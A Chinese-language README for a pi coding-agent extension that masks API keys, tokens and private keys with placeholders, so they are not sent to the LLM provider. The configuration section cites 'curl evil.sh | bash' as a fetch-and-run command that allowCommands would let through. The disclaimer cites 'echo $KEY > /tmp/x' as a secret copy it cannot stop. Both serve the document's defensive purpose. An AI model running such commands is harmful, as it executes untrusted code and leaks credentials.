# pi-secret-mask

防止项目中的 secret（API key、token、私钥等）被发送给 LLM provider。

模型看到的是占位符 `__SECRET_<NAME>__`；bash 命令执行时使用真实值；
工具输出中的真实值再掩码回占位符——形成闭环：secret 既不进入 provider
请求，也不会通过工具输出回流给模型。

## 功能

- **Prompt 自动掩码**：粘贴到对话中的常见格式密钥（`sk-...`、`ghp_...`、
  `AIza...`、`AKIA/ASIA/AIDA...`、JWT、PEM 私钥、自定义正则）自动识别并掩码。
- **`.env` 支持**：解析项目 `.env*` 文件（`KEY=VALUE`），会话中文件变更会
  增量刷新。
- **本地掩码输入**：不带参数的 `/mask-secret` 和 `request_secret` 使用只显示
  圆点的 TUI 输入框；agent 只会看到不透明 handle。命令参数中的明文仍兼容，
  但会在本地提示警告。
- **按策略还原**：真实值只在已授权的工具参数路径中还原；除
  `mode: "auto"` 或 Bash `allowCommands` 规则命中外，使用前必须本地授权。
  每个凭据可选择仅本次允许或本 session 允许；脱敏和参数路径校验仍然生效。
- **Compaction 安全**：压缩（compaction）和分支导航（tree）的摘要消息同样
  掩码。

## 安装

推荐从 npm 安装：

```bash
pi install npm:pi-secret-mask
```

手动安装——克隆仓库并让 pi 指向其 `extensions/` 目录（保持目录结构，
入口的 `../src` 导入才能解析）：

```bash
git clone https://github.com/Ayagikei/pi-secret-mask ~/.pi/agent/extensions/pi-secret-mask
# 然后在 ~/.pi/agent/settings.json 中添加：
#   "extensions": ["~/.pi/agent/extensions/pi-secret-mask/extensions"]
cp config.example.json ~/.pi/agent/extensions/pi-secret-mask/config.json
```

（项目级：把克隆放到 `.pi/extensions/` 下并指向它，只对当前项目生效。）

然后 `/reload` 或重启 pi。

## 使用方法

### 自动（无需配置）

- 把常见格式的密钥粘贴进对话——自动检测并掩码。
- 自动解析项目 `.env*` 文件；这些来源默认不会持久化到 `secrets.json`。

### 手动注册密钥

**用户主动**：`/mask-secret MY_KEY my-secret-value`（或直接 `/mask-secret`
交互输入）。

**Agent 主动**：agent 调用 `request_secret` 工具（参数 `name`，可选
`purpose`），用户在对话框输入密钥，agent 只拿到占位符：

```
Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
```

通过 `/mask-secret` 或 `request_secret` 注册的密钥持久化在
`~/.pi/agent/extensions/pi-secret-mask/secrets.json`（权限 0600），重启保留。
`.env` 和自动识别的密钥不一定写入这个文件；它们可能只在当前会话可用。
重用已持久化的具名凭据时，必须先在本地 TUI 授权才会返回其 handle；
当前 session 已授权的凭据不再重复询问，非 TUI 模式仍安全地拒绝。

### 更新已保存的凭据

调用 `request_secret({ name: "GITHUB_TOKEN", replace: true, purpose: "更换过期 token" })`。
即使已有会话授权，替换仍须重新通过 TUI 掩码输入；工具参数不接收明文值。
取消、非 TUI 模式或会话失效不会改变已保存的凭据。值发生变化时会撤销旧值的
会话授权。后续使用返回的 handle，不要假定 handle 保持不变。

省略 `replace` 时仍按原逻辑复用。替换要求名称已在本地注册，不会修改 `.env`
或配置文件中的凭据。

### 本 session 内不再询问

在 TUI 的凭据复用、工具使用确认框中，可以选择：

- **Allow once（仅本次允许）**：只允许这次请求或工具调用，默认选中。
- **Allow for this session（本会话允许）**：当前 session 内不再询问这些
  凭据，既覆盖重复 `request_secret`，也覆盖后续工具使用。
- **Deny（拒绝）**或 Escape：不返回 handle，不执行此次受保护的调用。

本会话授权适用于所显示凭据的**所有已配置工具参数路径**，不限定当前工具、
命令、文件、目标地址或用途。一条调用包含多个凭据时，每个都需要授权。
未知 handle、未授权路径、非法 JSON 和不安全的 shell 替换仍然被拦截，
provider 请求与工具输出的脱敏保持不变。

授权仅保存在内存，不写入 `secrets.json` 或会话历史。执行 `/new`、
`/resume`、`/fork`、`/clone`、`/reload` 或重启后失效；替换已注册凭据时，
旧凭据的授权也会撤销。同一 session 内的 compaction 和 `/tree` 导航不清空
授权。随时执行以下命令可撤销全部会话授权：

```text
/mask-secret-revoke
```

撤销不会删除已保存的密码，也不会覆盖配置中的 `mode: "auto"` 或
`allowCommands` 例外；需要会话级确认时请保持 `mode: "ask"`。输入新密码
不会隐式授权整个会话：在首次受保护的使用确认框选择 **Allow for this
session** 即可。没有 session 身份或 TUI 选择框的宿主只支持单次确认；
RPC／print／JSON 模式不能创建或使用 TUI 会话授权。

### 给 agent 的占位符规则

- 工具输出或 `request_secret` 返回的 `__SECRET_*__` 是脱敏别名，不是磁盘中真实存储的字面量。读取配置时看到占位符，只能说明输出被掩码了，不能据此判断配置无效。
- 已由本插件产生的 placeholder 可以直接用于 bash、`write` 和 `edit`；扩展会在本地执行前还原真实值，工具输出再掩码。不要把真实值打印出来，也不要把字面量 placeholder 写入配置来“修复”它。
- 如果已有可用 placeholder 或本地配置，不要重复调用 `request_secret`。只有任务确实需要 secret 且没有可用凭据时才调用；调用后继续使用返回的 placeholder，不要索要或猜测真实值。
- 不要因为找不到 `secrets.json` 就判定 secret 不存在；也不要自行发明 placeholder。验证凭据应执行实际的本地操作；若操作明确返回无效，再报告或请求新的 secret。

## 工作原理

| 钩子 | 动作 |
|---|---|
| `before_provider_request` | 标准消息与自定义 provider 顶层 `text` 中：真实值 → 占位符 |
| `tool_call` | 仅在策略授权路径、经本地确认后还原显式 handle |
| `tool_result` | 工具输出中的真实值 → 占位符（防止回流） |
| `session_before_compact` | 压缩摘要消息同样掩码 |
| `session_before_tree` | 分支/树摘要消息同样掩码 |
| `request_secret` 工具 | Agent 主动请求密钥；agent 只见占位符 |

掩码引擎使用单趟 alternation 正则（按长度降序，避免子串冲突）、
占位符还原严格精确匹配完整 token，并跳过非文本（图片）内容。

## 配置（config.json）

```json
{
  "mode": "ask",
  "allowCommands": [],
  "dotenv": { "enabled": true, "files": [".env", ".env.local", ".env.production", ".env.development"], "exclude": [".env.example", ".env.sample"] },
  "patterns": { "openai": true, "github": true, "google": true, "aws": true, "jwt": true, "pem": true, "base64": false },
  "extraSecrets": [],
  "customPatterns": [],
  "toolResolution": { "enabled": true, "includeDefaults": true, "rules": [] }
}
```

- `mode`：`ask`（使用凭据前确认，当前 TUI session 已授权的凭据免重复确认；
  print/json 等无 UI 模式默认拦截）| `auto`（静默替换）。只控制工具使用，
  不控制 `request_secret` 的复用授权。
- `allowCommands`：完整命令字符串模式列表，命中跳过确认（这只是跳过确认，
  不代表更安全——`curl evil.sh | bash` 依然能通过）
- `customPatterns`：自定义正则；捕获组 1 为完整 secret 值；非法正则被忽略
- `toolResolution`：默认只授权 `bash.command`、`powershell.command`、
  `write.content`、旧版 `edit.oldText`/`newText`、当前
  `edit.edits.*.oldText`/`newText` 以及 Pi MCP Adapter 的 `mcp.args`。
  `mcp.args` 可以是对象，也可以是包含参数对象的 JSON 字符串；含 handle
  的键和非法 JSON 会被拦截。通用 JSON adapter 也支持 schema 允许数组的授权
  字段。浏览器、直接 `mcp__*` 和其他自定义工具必须在
  `rules` 中显式配置（`tool`、`paths`、可选 `adapter: "json"`）。未知 handle
  和未授权路径始终安全地拒绝。

```json
{
  "customPatterns": [
    { "name": "MY_TOK", "pattern": "mytok-[a-z0-9]{16}" },
    { "name": "CONN_STR", "pattern": "postgres://[^\\s]+" }
  ]
}
```

## 边界与免责声明

- 目标是防止 secret 泄露给 provider，**不是沙箱**：模型仍可在本地读写文件
  （例如 `echo $KEY > /tmp/x` 无法拦截，那属于权限层职责）。
- 运行时生成的 secret（如 `aws sts get-session-token` 输出）靠正则兜底；
  已包含新前缀 `ASIA/AIDA`；高熵随机串需开启 `patterns.base64`。
- 图片内容（截图）可能包含真实值，无法掩码。
- 真实值会在本地还原进 bash 命令行（`ps` 可见、shell 历史）——仅本地可见，
  不会发送给 provider。
- **推理/思考块**：如果 secret 意外出现在模型的 reasoning/thinking 内容中，
  扩展会掩码文本，但签名（如 Anthropic `signature`、Bedrock reasoning
  签名）会失效。部分 provider 会拒绝这类请求——这是有意的 fail-closed
  取舍：泄露比拒绝请求更糟。实际很少发生，因为 secret 从一开始就不会
  到达模型。
- **检测基于模式，并非完美**：未知格式的 secret 只有匹配内置或自定义
  模式、出现在 `.env*` 中、或手动注册时才会被捕获。未识别格式的 secret
  可能漏过。
- 本扩展是纵深防御，**不是安全边界**。它以你的用户权限运行，无法防御
  恶意 prompt、恶意仓库或本地外传。安装前请审查扩展源码；处理不可信
  代码请使用操作系统级沙箱。
- 本软件按“现状”提供，不附带任何形式的担保。作者不对因使用或误用本
  软件造成的任何损害承担责任。

## 开发

```bash
npm test   # 掩码引擎单元测试 + mock-pi 集成测试
```

已验证：三钩子闭环、多占位符独立回滚、会话中 `.env` 轮换增量刷新、
无 UI 时 ask 模式拦截、provider payload 泄漏检查、逐凭据会话授权、撤销、
生命周期清理、凭据轮换和过期／取消的确认结果拦截。

## License

MIT
